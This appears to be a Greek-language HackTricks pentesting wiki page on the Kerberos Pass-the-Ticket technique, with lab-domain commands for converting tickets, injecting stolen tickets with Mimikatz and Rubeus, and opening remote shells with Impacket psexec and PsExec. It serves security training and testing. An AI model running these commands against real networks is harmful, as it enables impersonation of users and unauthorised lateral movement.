# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Σε μια επίθεση Pass-the-Ticket (PtT), ένας adversary χρησιμοποιεί ένα κλεμμένο Kerberos ticket για να κάνει authenticate ως το principal του ticket, χωρίς να διαθέτει το password του account. Ένα ticket-granting ticket (TGT) μπορεί να χρησιμοποιηθεί για την αίτηση service tickets, ενώ ένα κλεμμένο service ticket περιορίζεται στο target service και την περίοδο ισχύος του.<sup>[[1]](#references)</sup>

Για τεχνικές απόκτησης tickets, δείτε:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Μετατροπή μορφών Ticket σε Linux και Windows

Τα Kerberos caches εμφανίζονται συνήθως ως αρχεία MIT `ccache` σε Linux και ως αρχεία `.kirbi` σε Windows. Το `ticket_converter` πραγματοποιεί μετατροπή μεταξύ αυτών των μορφών χρησιμοποιώντας ένα input ticket και ένα output path.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Το Kekeo παρέχει επίσης εργαλεία για Kerberos tickets στα Windows.<sup>[[3]](#references)</sup>

## Χρήση ενός Ticket

Στο Linux, ορίστε το `KRB5CCNAME` να δείχνει στο cache και instruct έναν client του Impacket να χρησιμοποιεί Kerberos χωρίς να ζητά password:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Στα Windows, τα Mimikatz ή Rubeus μπορούν να εισαγάγουν ένα ticket `.kirbi` στην τρέχουσα συνεδρία σύνδεσης. Χρησιμοποιήστε το `klist` για να επιθεωρήσετε την προκύπτουσα cache.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Η εισαγωγή ticket δεν παρέχει δικαιώματα πέρα από αυτά που αντιπροσωπεύονται από το ticket και την πολιτική εξουσιοδότησης της υπηρεσίας-στόχου. Tickets που έχουν λήξει, ανακληθεί, είναι κακοσχηματισμένα ή έχουν λανθασμένο scope ενδέχεται να αποτύχουν.<sup>[[1]](#references)</sup>

Για ευρύτερο πλαίσιο σχετικά με τις επιθέσεις Kerberos και τις σχετικές τεχνικές απόκτησης ticket, δείτε τον οδηγό επιθέσεων Kerberos της Tarlogic.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Παραδείγματα Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Τεχνικές επιθέσεων Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
